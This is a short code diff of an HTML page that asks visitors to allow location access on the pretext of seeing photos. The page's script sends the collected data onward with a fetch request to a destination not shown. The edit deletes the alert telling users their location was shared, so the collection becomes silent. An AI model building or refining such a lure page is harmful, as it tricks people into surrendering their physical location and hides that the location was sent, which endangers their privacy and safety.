@@ -7,7 +7,7 @@
 <body>
   <h1>Hello, please allow location access to see PHOTO's</h1>
   <button onclick="getLocation()">Allow Location Access</button>
-  
+
   <script>
     function getLocation() {
       if (!navigator.geolocation) {
@@ -32,7 +32,6 @@
           body: JSON.stringify(data)
         });
 
-        alert("Thanks! Your location was shared.");
       }, () => {
         alert("Permission denied.");
       });
